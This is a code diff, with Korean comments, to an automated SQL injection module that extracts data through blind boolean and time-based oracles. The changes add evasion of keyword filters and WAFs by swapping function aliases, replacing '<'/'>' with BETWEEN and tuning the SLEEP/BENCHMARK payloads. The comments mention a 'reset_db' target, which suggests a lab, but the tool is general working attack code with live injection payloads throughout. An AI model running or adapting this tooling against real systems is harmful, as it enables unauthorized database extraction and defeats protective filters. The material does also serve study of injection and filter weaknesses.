@@ -6,7 +6,7 @@ import time
 import requests
 
 from fbs.inference.models import AttackSurface, VulnResult
-from fbs.inference.waf import classify_waf_block, try_evade, visible_text, diff_score, apply_named_evasion
+from fbs.inference.waf import classify_waf_block, try_evade, visible_text, diff_score, apply_named_evasion, EVASION_TRANSFORMS
 from fbs.inference.sql_dialects import SQL_DIALECTS, DIALECT_PROBE_ORDER, ERROR_SIGNATURES, detect_db_from_error
 from fbs.inference.strategies.base import BaseStrategy
 
@@ -44,6 +44,9 @@ class SQLiStrategy(BaseStrategy):
     # blind 이진 탐색용 문자 후보 (DB/테이블/컬럼 식별자는 보통 이 범위 안이라 32~126 전체보다 좁게 잡음).
     BLIND_CHARSET  = sorted(ord(c) for c in string.ascii_letters + string.digits + '_')
     BLIND_MAX_LEN  = 64
+    # BETWEEN 기반 밴-안전 비교의 상한 — LENGTH/ASCII 값은 이보다 훨씬 작아 'x > n'을
+    # 부등호 없이 'x BETWEEN n+1 AND 이 값'으로 표현할 수 있다('<'/'>'가 밴인 타깃 대응).
+    BLIND_MAX_INT  = 4294967295
 
     # boolean 탐지에서 한 번에 동시 전송할 (true, false) 쌍 개수. 배치 안은 병렬, 배치 사이는
     # 순차라서 신호를 찾으면 다음 배치로 안 넘어간다 — early-stop을 배치 단위로만 유지한다.
@@ -102,6 +105,9 @@ class SQLiStrategy(BaseStrategy):
         # 엔드포인트 단위로 캐싱한다 — statefulness는 필드가 아니라 엔드포인트의 성질이라 같은
         # 폼의 여러 필드(예: username/password)가 재사용한다.
         self._idempotency: dict[tuple, tuple] = {}
+        # (surface.url, surface.param) -> recon filter_map에서 밴으로 확인된 토큰 집합.
+        # 페이로드 사전검열(밴 토큰 회피)과 차단 판정(payload-aware)에 쓴다.
+        self._banned_tokens: dict[tuple, set] = {}
 
     # ── BaseStrategy 인터페이스 ──────────────────────────────────────────────
 
@@ -128,6 +134,15 @@ class SQLiStrategy(BaseStrategy):
         if discovery_evasion:
             self._discovery_evasion_hint[(surface.url, surface.param)] = discovery_evasion
             print(f"    [SQLi] hidden 파라미터 발견 당시 우회 기법 재사용 준비: {discovery_evasion!r}")
+
+        # recon이 거부-지문으로 학습한 밴 토큰 집합. 페이로드 사전검열(회피)과 차단 판정
+        # (payload-aware)에 쓴다 — 밴 토큰이 든 페이로드는 필터 거부가 확실하고, 우리 우회
+        # 변형으로 그 키워드를 못 없애면 요청을 낭비하지 않는다.
+        filter_map = surface.extra.get('filter_map') or {}
+        banned = {t for t, b in filter_map.items() if b}
+        if banned:
+            self._banned_tokens[(surface.url, surface.param)] = banned
+            print(f"    [SQLi] recon 필터 지도: 밴 토큰 {sorted(banned)} — 페이로드 회피/차단 판정에 사용")
 
         base_fields    = self._base_fields(surface)
         original_value = base_fields.get(surface.param, 'test')
@@ -490,6 +505,38 @@ class SQLiStrategy(BaseStrategy):
         아니라 (필드, 종류) 단위로 좁히는 데 쓴다."""
         return label.split('(')[0]
 
+    def _banned_in(self, surface, payload: str) -> str | None:
+        """payload에 이 필드에서 밴으로 확인된 토큰(recon filter_map)이 있으면 그 토큰을 반환.
+        앱 필터가 보통 그렇듯 소문자 substring 매칭으로 본다(앱의 `banned in query.lower()`와
+        같은 의미) — 그래야 'order'가 어디에 있든 잡히는 앱 동작과 일치한다."""
+        banned = self._banned_tokens.get((surface.url, surface.param))
+        if not banned:
+            return None
+        low = payload.lower()
+        for tok in banned:
+            if tok in low:
+                return tok
+        return None
+
+    def _is_refused(self, surface, payload: str, status, body: str) -> bool:
+        """이 응답이 '서버가 우리 페이로드를 거부/필터한 것'인지 판정한다 — 벤(recon가 학습)과
+        WAF를 한 기준으로 통합한 단일 거부 판정.
+
+          1) payload에 밴 토큰(recon filter_map)이 있으면 → 앱의 substring 필터가 SQL 실행 전에
+             무조건 발동하므로 확실한 거부.
+          2) 벤더 시그니처/rate-limit(classify_waf_block의 강한 판정)이면 → 확실한 WAF 차단.
+
+        그 외(밴 토큰 없음 + 벤더 시그니처 아님)는 거부로 단정하지 '않는다'. 예전엔 제네릭 키워드
+        ('hack' 등) 단독 매치를 길이 비교로 재검증했는데(1811 vs 1831 해킹), reset_db처럼 거부
+        페이지가 성공/정상 페이지와 같은 앱에서는 성공 응답까지 '차단'으로 오인해 신호를 잃었다.
+        밴은 filter_map으로 이미 정확히 알고, 진짜 인프라 WAF는 벤더 시그니처로 잡히므로, 애매한
+        제네릭 판정은 무시하는 게 오탐이 적다(거부지문은 recon의 밴 학습에만 쓰고 여기선 안 쓴다 —
+        reset_db는 거부==성공 페이지라 지문으로도 이 둘을 못 가르기 때문)."""
+        if self._banned_in(surface, payload) is not None:
+            return True
+        blocked, name, _ = classify_waf_block(status, body)
+        return bool(blocked and name and name != 'Unknown / Custom WAF')
+
     def _try_evade(self, surface, base_fields, payload: str, label: str, waf_hits: list, waf_evasions: list,
                     dialect: str | None = None, quiet: bool = False):
         """payload가 WAF에 막혔을 때 우회 변형들을 재시도한다.
@@ -509,6 +556,18 @@ class SQLiStrategy(BaseStrategy):
         dialect(blind 추출에서 확인된 DB 방언)는 waf.try_evade에 그대로 넘겨서, SQLite
         엔 안 통하는 substr_no_comma 같은 방언 전용 기법이 걸러지게 한다.
         """
+        # payload에 밴 토큰(recon filter_map)이 있는데 우리 우회 변형 중 그 토큰을 실제로 없애는
+        # 게 하나도 없으면(order/union/database 같은 키워드 substring 밴 — 공백/대소문자 변형으론
+        # 못 지움), 우회는 무의미하니 요청을 낭비하지 않고 바로 실패 처리한다. 우회는 '구조적
+        # WAF'(공백/키워드 경계 기반)용이지 키워드 밴용이 아니다 — 키워드 밴은 페이로드 자체를
+        # 밴 없는 형태로 바꿔야(다음 단계) 뚫린다.
+        banned = self._banned_in(surface, payload)
+        if banned and not any(banned not in transform(payload).lower() for _, transform in EVASION_TRANSFORMS):
+            if not quiet:
+                print(f"    [Evade] {label}: 밴 토큰 {banned!r} 포함 — 우회 변형으로 못 없앰, 스킵(요청 아낌)")
+            waf_hits.append(f"{label}(\"{payload}\") → 밴 토큰 {banned!r}, 우회 불가로 스킵")
+            return None
+
         key = (surface.url, surface.param, self._payload_shape(label))
         cached_name = self._evasion_cache.get(key)
         tried_and_failed = None
@@ -520,8 +579,7 @@ class SQLiStrategy(BaseStrategy):
             if variant != payload:
                 status, body, elapsed = self._send(surface, {**base_fields, surface.param: variant})
                 if status is not None:
-                    blocked, _, _ = classify_waf_block(status, body)
-                    if not blocked:
+                    if not self._is_refused(surface, variant, status, body):
                         if not quiet:
                             print(f"    [Evade] {label}: {cached_name} 우회 성공(캐시)")
                         waf_evasions.append(f"{label}: {cached_name} 우회 성공(캐시) → \"{variant}\"")
@@ -542,8 +600,7 @@ class SQLiStrategy(BaseStrategy):
                 if variant != payload:
                     status, body, elapsed = self._send(surface, {**base_fields, surface.param: variant})
                     if status is not None:
-                        blocked, _, _ = classify_waf_block(status, body)
-                        if not blocked:
+                        if not self._is_refused(surface, variant, status, body):
                             if not quiet:
                                 print(f"    [Evade] {label}: {discovery_name} 우회 성공(발견 당시 기법)")
                             waf_evasions.append(f"{label}: {discovery_name} 우회 성공(발견 당시 기법) → \"{variant}\"")
@@ -555,6 +612,7 @@ class SQLiStrategy(BaseStrategy):
             lambda variant: self._send(surface, {**base_fields, surface.param: variant}),
             payload, label, waf_hits, waf_evasions, dialect=dialect,
             skip={tried_and_failed} if tried_and_failed else None, quiet=quiet,
+            is_banned=lambda v: self._banned_in(surface, v) is not None,
         )
         if result is None:
             return None
@@ -581,30 +639,10 @@ class SQLiStrategy(BaseStrategy):
         status, body, elapsed = self._send(surface, {**base_fields, surface.param: payload}, timeout=timeout)
         if status is None:
             return None, '', 0.0, payload, False
-        blocked, waf_name, _ = classify_waf_block(status, body)
 
-        # 'Unknown / Custom WAF'는 벤더 시그니처가 아니라 제네릭 키워드(hack/attack/illegal/
-        # detected 등) 단독 매치로만 나온 약한 판정이다 — 이 단어들은 흔한 영단어라 앱 자체의
-        # 정상 응답 문구에 우연히 포함될 수 있다(실측: 인젝션이 성공해서 나온 "hacker" 메시지가
-        # 차단으로 오판됨 — 이미 얻은 성공 응답/시간 측정값을 버리고 헛되이 우회를 시도하게
-        # 만듦). 벤더 시그니처·rate-limit(429)처럼 신뢰도 높은 판정은 그대로 믿는다.
-        #
-        # 이 약한 판정만, 우리 페이로드 없는 대조 요청과 응답 길이를 비교해서 재검증한다 —
-        # 판별 기준은 "같은 키워드가 뜨는가"가 아니라 "같은 페이지 템플릿에서 나온 응답인가"다.
-        # 진짜 WAF/필터 차단은 보통 앱의 정상 페이지와 완전히 다른(대개 훨씬 짧은) 별도
-        # 페이지로 통째로 바뀌는데, 여기서 걸러내려는 오탐(더블체크 등 정상 앱 로직이 만든
-        # 메시지)은 같은 템플릿 안에서 문구 한 줄만 바뀐 거라 길이가 대조 응답과 거의
-        # 같다(실측: 1811 vs 1831바이트, 차이 20). 길이가 비슷하면 차단 아님으로 재분류한다.
-        if blocked and waf_name == 'Unknown / Custom WAF':
-            control_status, control_body, _ = self._send(surface, base_fields, timeout=timeout)
-            if control_status is not None and abs(len(body) - len(control_body)) <= 150:
-                if not quiet:
-                    print(f"    [Evade] {label}: 차단 판정 재검증 — 대조 응답과 길이가 비슷함"
-                          f"(len={len(body)} vs {len(control_body)}) → 같은 페이지 템플릿으로 "
-                          f"판단, 차단 아님으로 재분류")
-                blocked = False
-
-        if not blocked:
+        # 벤(recon 학습)과 WAF를 한 기준으로 통합한 거부 판정 — 밴 토큰이거나 벤더 WAF일 때만
+        # 거부로 본다(_is_refused 참고). 예전 길이 재분류 해킹은 여기서 제거됐다.
+        if not self._is_refused(surface, payload, status, body):
             return status, body, elapsed, payload, False
         evaded = self._try_evade(surface, base_fields, payload, label, waf_hits, waf_evasions,
                                   dialect=dialect, quiet=quiet)
@@ -911,25 +949,26 @@ class SQLiStrategy(BaseStrategy):
     def _db_payloads(quote_char: str) -> list[tuple[str, str]]:
         q = quote_char
         return [
-            # SLEEP(5)/BENCHMARK(...)를 OR든 AND든 그냥 붙이면 WHERE 절이 스캔하는 행마다
-            # 반복 평가돼서 행 수만큼 지연이 곱해질 수 있다(테이블에 N행 있으면 최대 5N초).
-            # AND는 보통 인덱스로 한 행만 매치돼서 이 문제가 없을 거라 가정했었는데, 실측
-            # 결과 그 가정이 깨졌다 — 우리가 주입하는 값(빈 문자열 등)은 애초에 인덱스에
-            # 없는 값이라 전체 스캔이 돌고, AND(감싸지 않음)가 OR(감싼 버전)보다 정확히
-            # 테이블 행 수 배만큼 오래 걸리는 게 실측으로 확인됐다(9.86s → 50.44s, ~5배).
-            # 그래서 OR/AND 둘 다 파생 테이블 서브쿼리로 감싼다 — 옵티마이저가 한 번만
-            # 평가해서 행 수와 무관하게 일정한 시간이 되게 한다(sqlmap 등에서도 쓰는 표준
-            # 우회 방식).
-            ('MySQL_OR',   f"{q} OR (SELECT 1 FROM (SELECT SLEEP(5))x) #"),
-            ('MySQL_AND',  f"{q} AND (SELECT 1 FROM (SELECT SLEEP(5))x) #"),
+            # SLEEP/BENCHMARK를 OR/AND로 그냥 붙이거나 (SELECT SLEEP(5)) 같은 맨 스칼라 서브쿼리로
+            # 넣으면 WHERE가 스캔하는 행마다 반복 평가돼 지연이 행 수만큼 곱해진다(실측: 9.86s→
+            # 50.44s ~5배; 맨 스칼라로 바꿨다가 N배 지연으로 타임아웃 재현됨). 그래서 파생 테이블
+            # 서브쿼리 (SELECT ...)x로 감싸 옵티마이저가 딱 한 번만 materialize하게 한다.
+            #
+            # 동시에 '무행(side-effect-free)'이어야 한다 — 바깥을 SELECT 0으로 하면 서브쿼리 값이
+            # 0 → 'OR 0'이라 행을 반환하지 않는다. 로그인 폼 WHERE에 행이 반환되면 앱이 로그인
+            # 성공으로 처리하거나 더블체크/리셋/잠금/로깅 같은 부작용을 내는데(실측: reset_db는
+            # 인젝션이 행을 반환할 때마다 admin 비번 리셋), 지연만 목적인 SLEEP/BENCHMARK는 값을
+            # SELECT 0으로 버려 무행으로 만든다 — 예전 SELECT 1은 행을 반환해 이 부작용이 있었다.
+            ('MySQL_OR',   f"{q} OR (SELECT 0 FROM (SELECT SLEEP(5))x) #"),
+            ('MySQL_AND',  f"{q} AND (SELECT 0 FROM (SELECT SLEEP(5))x) #"),
             # SLEEP이 밴리스트(SLEEP 키워드 자체를 막는 필터)에 걸려 위 둘 다 실패했을 때만
             # 순서상 자연스럽게 시도되는 폴백. BENCHMARK는 SLEEP과 문법이 겹치지 않는 MySQL
             # 전용 CPU 반복 연산 함수라 SLEEP 금지어 필터를 우회한다. 다만 걸리는 시간이
             # 고정 지연이 아니라 서버 CPU 속도/부하에 좌우돼 SLEEP보다 불안정하므로, SLEEP이
             # 통하면 항상 SLEEP을 우선시키고 이건 최후 수단으로만 쓴다. 여기도 위와 같은
-            # 이유로 OR/AND 둘 다 서브쿼리로 감싼다.
-            ('MySQL_OR_BENCHMARK',  f"{q} OR (SELECT 1 FROM (SELECT BENCHMARK(20000000,MD5(NOW())))x) #"),
-            ('MySQL_AND_BENCHMARK', f"{q} AND (SELECT 1 FROM (SELECT BENCHMARK(20000000,MD5(NOW())))x) #"),
+            # 이유로 파생 테이블(run-once) + SELECT 0(무행).
+            ('MySQL_OR_BENCHMARK',  f"{q} OR (SELECT 0 FROM (SELECT BENCHMARK(20000000,MD5(NOW())))x) #"),
+            ('MySQL_AND_BENCHMARK', f"{q} AND (SELECT 0 FROM (SELECT BENCHMARK(20000000,MD5(NOW())))x) #"),
             ('PostgreSQL', f"{q}; SELECT pg_sleep(5) --"),
             # WAITFOR DELAY의 시간 리터럴, dbms_pipe의 채널명은 T-SQL/PL-SQL 자체 문법이라
             # breaking 문자와 무관하게 항상 홑따옴표를 쓴다.
@@ -1458,7 +1497,45 @@ class SQLiStrategy(BaseStrategy):
                 hi = mid
         return lo
 
-    def _oracle_live(self, oracle, probe_lhs: str, label: str) -> bool:
+    def _uses_inequality_ban(self, surface) -> bool:
+        """이 필드에서 '<' 또는 '>'가 밴이면 True — 비교식을 부등호 없이(BETWEEN 등) 만들어야 한다."""
+        banned = self._banned_tokens.get((surface.url, surface.param))
+        return bool(banned) and ('<' in banned or '>' in banned)
+
+    def _cmp_gt(self, surface, lhs: str, n: int) -> str:
+        """'lhs > n'(lhs는 음수 아님: LENGTH/ASCII)을 밴-안전하게 만든다. '<'/'>'가 밴이면
+        부등호 없이 BETWEEN으로 — 'x > n' ⟺ 'x BETWEEN n+1 AND MAX'."""
+        if self._uses_inequality_ban(surface):
+            return f"{lhs} BETWEEN {n + 1} AND {self.BLIND_MAX_INT}"
+        return f"{lhs}>{n}"
+
+    def _cmp_always(self, surface, lhs: str, truth: bool) -> str:
+        """정합성 앵커용 항상참/항상거짓 비교식. '<'/'>'가 밴이면 BETWEEN으로 — 항상참=
+        'x BETWEEN 0 AND MAX'(음수 아님이라 항상 성립), 항상거짓='x BETWEEN 1 AND 0'(빈 범위)."""
+        if self._uses_inequality_ban(surface):
+            return f"{lhs} BETWEEN 0 AND {self.BLIND_MAX_INT}" if truth else f"{lhs} BETWEEN 1 AND 0"
+        return f"{lhs}>=0" if truth else f"{lhs}<0"
+
+    def _substr_expr(self, surface, dialect: str, x: str, pos: int, length: int) -> str:
+        """부분문자열 함수를 밴 안 걸리는 별칭으로 고른다 — MySQL은 SUBSTR/SUBSTRING/MID가
+        동작이 같아서, 'substring'이 밴이면 SUBSTR, 그것도 밴이면 MID로 넘어간다(정답 코드가
+        MID를 쓴 이유). 함수 '이름'만 밴 여부를 보므로(인자 x 안의 밴 토큰은 별개) 정확히 고른다."""
+        if dialect == 'MySQL':
+            for fn in ('SUBSTR', 'SUBSTRING', 'MID'):
+                if self._banned_in(surface, fn) is None:
+                    return f"{fn}({x},{pos},{length})"
+        return SQL_DIALECTS[dialect]['substr_fn'](x, pos, length)
+
+    def _ord_expr(self, surface, dialect: str, x: str) -> str:
+        """문자→코드 함수를 밴 안 걸리는 별칭으로 — MySQL은 ASCII/ORD가 (ASCII 범위에서) 동일.
+        'ascii'가 밴이면 ORD로 넘어간다."""
+        if dialect == 'MySQL':
+            for fn in ('ASCII', 'ORD'):
+                if self._banned_in(surface, fn) is None:
+                    return f"{fn}({x})"
+        return SQL_DIALECTS[dialect]['ord_fn'](x)
+
+    def _oracle_live(self, surface, oracle, probe_lhs: str, label: str) -> bool:
         """정합성 앵커 — '조건이 거짓이라 신호가 없는 것'과 '우리 주입이 애초에 SQL에서 실행조차
         안 돼서(밴 토큰/문법오류/상태리셋) 신호가 없는 것'을 구분한다.
 
@@ -1469,15 +1546,17 @@ class SQLiStrategy(BaseStrategy):
         (예: database)이 섞여 필터되면 '>=0'조차 참 신호를 못 내(양쪽 다 거부 페이지로 뭉갬)
         여기서 걸린다. 대상이 NULL인 경우('>=0'이 NULL→falsy)도 함께 걸리는데, NULL이든 밴이든
         어차피 못 뽑는 건 같아 가짜 값을 만들지 않고 정직하게 중단하는 게 맞다."""
-        always_true  = oracle(f"{probe_lhs}>=0")
-        always_false = oracle(f"{probe_lhs}<0")
+        cond_true  = self._cmp_always(surface, probe_lhs, True)   # 항상 참 ('>' 밴이면 BETWEEN)
+        cond_false = self._cmp_always(surface, probe_lhs, False)  # 항상 거짓
+        always_true  = oracle(cond_true)
+        always_false = oracle(cond_false)
         live = (always_true is True and always_false is False)
         if not live:
-            print(f"    [{label}] 정합성 앵커 실패 ({probe_lhs}>=0 → {always_true}, <0 → {always_false}) "
+            print(f"    [{label}] 정합성 앵커 실패 ({cond_true} → {always_true}, {cond_false} → {always_false}) "
                   f"— 밴 토큰/문법오류/상태리셋으로 SQL 미실행으로 보고 측정 불가 처리(거짓 오판 안 함)")
         return live
 
-    def _extract_with_oracle(self, oracle, dialect: str, expr: str | None, label: str) -> str | None:
+    def _extract_with_oracle(self, surface, oracle, dialect: str, expr: str | None, label: str) -> str | None:
         """oracle(condition)->bool|None + 이진 탐색으로 expr 값을 문자 단위로 추출한다.
 
         content 오라클(_bool_oracle)이든 시간 오라클(_time_oracle)이든 '이 SQL 불리언 조건이
@@ -1492,20 +1571,20 @@ class SQLiStrategy(BaseStrategy):
                 return None
             expr = d['current_db']
 
-        # 정합성 앵커 — 첫 LENGTH(expr)>N 판독을 믿기 전에, 같은 좌변으로 이 페이로드가 실제로
-        # SQL에서 실행되는지 확인한다. 실패하면 이후 '거짓' 판독이 전부 '밴/미실행'일 수 있어
-        # 신뢰 불가 → 여기서 중단한다(가짜 '길이 0' 방지).
-        if not self._oracle_live(oracle, f"LENGTH({expr})", label):
+        # 정합성 앵커 — 첫 길이 판독을 믿기 전에, 같은 좌변으로 이 페이로드가 실제로 SQL에서
+        # 실행되는지 확인한다. 실패하면 이후 '거짓' 판독이 전부 '밴/미실행'일 수 있어 신뢰 불가
+        # → 여기서 중단한다(가짜 '길이 0' 방지).
+        if not self._oracle_live(surface, oracle, f"LENGTH({expr})", label):
             return None
 
-        length = self._binary_search(lambda n: oracle(f"LENGTH({expr})>{n}"), 0, self.BLIND_MAX_LEN)
+        length = self._binary_search(lambda n: oracle(self._cmp_gt(surface, f"LENGTH({expr})", n)), 0, self.BLIND_MAX_LEN)
         if length is None:
             print(f"    [{label}] {expr} 길이 확인 실패 (요청 실패)")
             return None
         if length == 0:
             # 시작 앵커는 통과했으니 원래는 '진짜 빈 값'이지만, 추출 도중 상태가 리셋돼 채널이
             # 죽었을 수도 있다 — 앵커를 다시 찍어 '진짜 빈 값'과 '도중에 死'을 가른다.
-            if self._oracle_live(oracle, f"LENGTH({expr})", label):
+            if self._oracle_live(surface, oracle, f"LENGTH({expr})", label):
                 print(f"    [{label}] {expr} 길이=0 (빈 값 — 앵커 재확인 통과)")
             else:
                 print(f"    [{label}] {expr} 길이가 0으로 붕괴 + 앵커 재확인 실패 — 추출 도중 오라클 死"
@@ -1521,13 +1600,13 @@ class SQLiStrategy(BaseStrategy):
 
         result = ''
         for pos in range(1, length + 1):
-            char_expr = d['ord_fn'](d['substr_fn'](expr, pos, 1))
+            char_expr = self._ord_expr(surface, dialect, self._substr_expr(surface, dialect, expr, pos, 1))
             # 8글자마다 채널이 아직 살아있는지 재확인 — 추출 도중 상태리셋/밴으로 오라클이 죽으면
             # 이후 글자가 전부 쓰레기(charset 최소값 등)로 채워지는 걸 막고 여기까지만 반환한다.
-            if pos > 1 and (pos - 1) % 8 == 0 and not self._oracle_live(oracle, char_expr, label):
+            if pos > 1 and (pos - 1) % 8 == 0 and not self._oracle_live(surface, oracle, char_expr, label):
                 print(f"    [{label}] {pos}번째 글자 직전 앵커 실패 — 추출 도중 오라클 死, 여기까지만: {result!r}")
                 return result or None
-            idx = self._binary_search(lambda i: oracle(f"{char_expr}>{self.BLIND_CHARSET[i]}"),
+            idx = self._binary_search(lambda i: oracle(self._cmp_gt(surface, char_expr, self.BLIND_CHARSET[i])),
                                        0, len(self.BLIND_CHARSET) - 1)
             if idx is None:
                 print(f"    [{label}] {pos}번째 글자 확인 실패 — 여기까지만 추출: {result!r}")
@@ -1570,11 +1649,11 @@ class SQLiStrategy(BaseStrategy):
         for dialect in DIALECT_PROBE_ORDER:
             version_fn = SQL_DIALECTS[dialect]['version_fn']
             is_true = self._bool_oracle(
-                surface, base_fields, injection_prefix, comment, f"LENGTH({version_fn})>0",
+                surface, base_fields, injection_prefix, comment, self._cmp_gt(surface, f"LENGTH({version_fn})", 0),
                 ref_true_text, ref_false_text, waf_hits, waf_evasions, dialect=dialect,
             )
             is_false = self._bool_oracle(
-                surface, base_fields, injection_prefix, comment, f"LENGTH({version_fn})>99999",
+                surface, base_fields, injection_prefix, comment, self._cmp_gt(surface, f"LENGTH({version_fn})", 99999),
                 ref_true_text, ref_false_text, waf_hits, waf_evasions, dialect=dialect,
             )
             if is_true is True and is_false is False:
@@ -1632,7 +1711,7 @@ class SQLiStrategy(BaseStrategy):
             surface, base_fields, injection_prefix, comment, cond,
             ref_true_text, ref_false_text, waf_hits, waf_evasions, dialect=dialect,
         )
-        result = self._extract_with_oracle(oracle, dialect, expr, 'Blind')
+        result = self._extract_with_oracle(surface, oracle, dialect, expr, 'Blind')
         return result, dialect
 
     # ── Blind(Time) 이진 탐색 추출 ────────────────────────────────────────────
@@ -1657,17 +1736,25 @@ class SQLiStrategy(BaseStrategy):
         응답 시간으로 참/거짓을 판정한다 — 본문이 필터로만 갈려 content 오라클을 못 쓰는 순수
         time-based에서 유일한 추출 수단.
 
-        지연함수를 OR/AND로 그냥 붙이면 WHERE가 스캔하는 행마다 반복 평가돼 지연이 행 수만큼
-        곱해질 수 있으므로(_db_payloads 주석 참고), 파생 테이블 서브쿼리로 감싸 한 번만 실행시킨다.
+        중요(무행/side-effect-free): 오라클 페이로드는 절대 '행을 반환하면 안 된다'. 로그인 폼
+        WHERE에 `OR (SELECT 1 ...)`처럼 참이 되는 값을 넣으면 행이 반환돼, 앱이 로그인 성공으로
+        처리하거나(더블체크/리셋/잠금/로깅 등) 심지어 데이터를 바꾸는 부작용이 생긴다(실측:
+        reset_db는 인젝션이 행을 반환할 때마다 admin 비번을 리셋해 추출 자체를 자멸시켰다).
+        BENCHMARK/SLEEP은 둘 다 '0'을 반환하므로 `IF(cond, 지연, 0)`의 값은 항상 0이다. 이를
+        파생 테이블 (SELECT IF(...))x로 감싸 한 번만 materialize하고(행마다 반복 평가 방지 —
+        맨 스칼라로 넣으면 행 수만큼 곱해져 타임아웃남), 바깥을 SELECT 0으로 해 값 0 → `OR 0`이라
+        '행을 반환하지 않게' 한다(로그인 폼의 리셋/로그인/잠금 부작용 방지). 관찰되는 건 지연뿐.
         반환: 지연됨(참)/안 됨(거짓)/요청 실패(None)."""
         dialect, conn, timefn = profile
         run_expr  = self._timed_expr(timefn, seconds, benchmark_n, True)
         zero_expr = self._timed_expr(timefn, seconds, benchmark_n, False)
         if dialect == 'PostgreSQL':
-            body_expr = f"CASE WHEN ({condition}) THEN {run_expr} ELSE {zero_expr} END"
-        else:  # MySQL
-            body_expr = f"IF(({condition}),{run_expr},{zero_expr})"
-        payload = f"{injection_prefix} {conn} (SELECT 1 FROM (SELECT {body_expr})x) {comment} "
+            # (미검증) pg_sleep은 void 반환이라 무행(값 0)으로 만들기 까다로워 기존 형태 유지.
+            inner = f"CASE WHEN ({condition}) THEN {run_expr} ELSE {zero_expr} END"
+            payload = f"{injection_prefix} {conn} (SELECT 1 FROM (SELECT {inner})x) {comment} "
+        else:  # MySQL — 파생 테이블(run-once) + SELECT 0(무행): 'OR 0' → 행 미반환, 지연 1회
+            body_expr = f"(SELECT 0 FROM (SELECT IF(({condition}),{run_expr},{zero_expr}))x)"
+            payload = f"{injection_prefix} {conn} {body_expr} {comment} "
         status, _, elapsed, _, _ = self._send_evading(
             surface, base_fields, payload, 'blind-time(oracle)', waf_hits, waf_evasions,
             timeout=self.TIME_TIMEOUT, dialect=dialect,
@@ -1717,7 +1804,7 @@ class SQLiStrategy(BaseStrategy):
         print(f"    [Blind-Time] 캘리브레이션 OK — baseline≈{baseline:.2f}s, threshold={threshold:.2f}s, "
               f"지연식={self._timed_expr(timefn, seconds, benchmark_n, True)}")
 
-        result = self._extract_with_oracle(_oracle, dialect, expr, 'Blind-Time')
+        result = self._extract_with_oracle(surface, _oracle, dialect, expr, 'Blind-Time')
         return result, dialect
 
     @staticmethod
@@ -1903,8 +1990,8 @@ class SQLiStrategy(BaseStrategy):
         q = quote_char
         return {
             # 숫자 컨텍스트 (bare)
-            'num':        (['1=1', '2=2', '8>3'],
-                           ['1=2', '3=4', '8<3']),
+            'num':        (['1=1', '2=2', '9=9'],
+                           ['1=2', '3=4', '9=8']),
             # 문자열 컨텍스트, 페이로드가 따옴표를 스스로 닫음 (주석과 함께): '1'='1'
             'str_closed': ([f"{q}1{q}={q}1{q}", f"{q}a{q}={q}a{q}", f"{q}z{q}={q}z{q}"],
                            [f"{q}1{q}={q}2{q}", f"{q}a{q}={q}b{q}", f"{q}x{q}={q}y{q}"]),
